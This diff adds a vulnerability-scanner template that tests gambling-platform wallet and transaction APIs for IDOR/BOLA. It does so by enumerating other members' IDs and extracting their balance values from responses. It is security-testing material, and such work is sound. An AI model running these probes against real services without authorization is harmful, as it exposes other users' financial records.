@@ -1,0 +1,114 @@
+id: gambling-idor-player-balance
+info:
+  name: Gambling Platform - Player Balance / Wallet IDOR (BOLA)
+  author: redsaas-team
+  severity: high
+  description: |
+    偵測博弈平台會員錢包/餘額 API 的 BOLA 漏洞（OWASP API1）。
+    攻擊者以自己的 JWT 操控 URL 中的 user_id/member_id，
+    嘗試存取其他會員的餘額、交易記錄或錢包資訊。
+    全局 -H "Authorization: Bearer <token>" 由掃描器注入，無需在此寫死。
+  reference:
+    - https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
+  tags: gambling,idor,bola,api,finance,owasp-api1
+  metadata:
+    max-request: 30
+
+http:
+  # ── 枚舉 uid 2~5（自己通常是 uid=1 的下一個）
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/player/{{uid}}/balance"
+      - "{{BaseURL}}/api/v1/player/{{uid}}/balance"
+      - "{{BaseURL}}/api/member/{{uid}}/wallet"
+      - "{{BaseURL}}/api/v1/member/{{uid}}/wallet"
+      - "{{BaseURL}}/api/account/{{uid}}/funds"
+      - "{{BaseURL}}/api/user/{{uid}}/finance"
+      - "{{BaseURL}}/member/balance?uid={{uid}}"
+      - "{{BaseURL}}/wallet/query?memberId={{uid}}"
+      - "{{BaseURL}}/api/v1/wallet?user_id={{uid}}"
+      - "{{BaseURL}}/api/finance/balance?member_id={{uid}}"
+    payloads:
+      uid:
+        - "2"
+        - "3"
+        - "4"
+        - "5"
+        - "100"
+        - "1000"
+    attack: clusterbomb
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "balance"
+          - "amount"
+          - "wallet"
+          - "funds"
+          - "credit"
+          - "餘額"
+          - "點數"
+          - "金幣"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "unauthorized"
+          - "forbidden"
+          - "access denied"
+          - "permission denied"
+          - "not your"
+        negative: true
+        condition: or
+
+    extractors:
+      - type: regex
+        name: balance_value
+        part: body
+        regex:
+          - '"balance"\s*:\s*([0-9.]+)'
+          - '"amount"\s*:\s*([0-9.]+)'
+          - '"credit"\s*:\s*([0-9.]+)'
+
+  # ── 測試交易記錄 IDOR
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/player/{{uid}}/transactions"
+      - "{{BaseURL}}/api/member/{{uid}}/deposit-records"
+      - "{{BaseURL}}/api/member/{{uid}}/withdrawal-records"
+      - "{{BaseURL}}/api/v1/finance/history?member_id={{uid}}"
+    payloads:
+      uid:
+        - "2"
+        - "3"
+        - "100"
+    attack: clusterbomb
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "transaction"
+          - "deposit"
+          - "withdrawal"
+          - "record"
+          - "history"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "unauthorized"
+          - "forbidden"
+        negative: true
+        condition: or
